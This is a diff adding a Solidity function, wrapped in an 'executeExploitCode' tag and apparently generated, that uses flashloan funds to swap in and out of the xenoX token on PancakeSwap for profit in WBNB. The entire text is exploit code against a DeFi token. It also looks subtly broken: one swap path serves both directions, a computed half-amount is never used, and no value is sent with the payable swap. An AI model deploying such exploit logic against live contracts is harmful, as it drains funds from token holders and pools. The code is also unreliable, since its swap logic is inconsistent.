@@ -1,0 +1,38 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    address[] memory path = new address[](2);
+    path[0] = address(token); // xenoX token
+    path[1] = uniswapRouter.WETH(); // WBNB
+
+    // Step 1: Swap half of the flashloan amount for xenoX tokens
+    uint256 halfAmount = amount / 2;
+    pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens(
+        0, // Accept any amount of xenoX tokens
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // Step 2: Retrieve balance of xenoX tokens obtained
+    uint256 xenoXBalance = IERC20(token).balanceOf(address(this));
+    
+    // Step 3: Approve the pancake router to spend xenoX tokens
+    IERC20(token).approve(address(pancakeRouter), xenoXBalance);
+
+    // Step 4: Swap xenoX tokens back to WBNB
+    pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        xenoXBalance,
+        0, // Accept any amount of WBNB
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // Step 5: Collect profits in WBNB
+    uint256 finalWBNBBalance = address(this).balance;
+
+    console.log("Profit in WBNB: %s", finalWBNBBalance);
+}
+</executeExploitCode>
+```
